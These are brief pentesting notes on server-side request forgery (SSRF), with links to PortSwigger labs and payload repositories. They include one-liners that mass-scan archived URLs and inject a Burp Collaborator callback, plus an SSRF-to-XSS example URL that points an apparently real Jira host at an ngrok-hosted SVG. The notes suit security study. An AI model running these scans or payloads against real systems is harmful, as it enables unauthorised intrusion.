# SSRF

```
In-band  
    https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
Blind SSRF 
    https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
```

```
Blind SSRF in Headers + Autorepeater
```

### bind SSRF to XSS

```
SSRF Example + SSRF -> XSS 
https://jira.intellectdesign.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://bbc3d4d64a12.ngrok.io/exp.svg
```

### Automation

```
echo target | waybackurls | gf ssrf | httpx | qsreplace burpcollaborator |  xargs -I{} http GET {}
echo target | waybackurls | gf ssrf | qsreplace burpcollaborator |  httpx 
gau -subs target | deduplicate | gf ssrf | qsreplace burpcollaborator |  httpx 
```

### Blind SSRF in File Converters

{% embed url="https://pdfcrowd.com/#convert_by_input" %}

### SSRF Payloads

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
https://github.com/swisskyrepo/SSRFmap
```
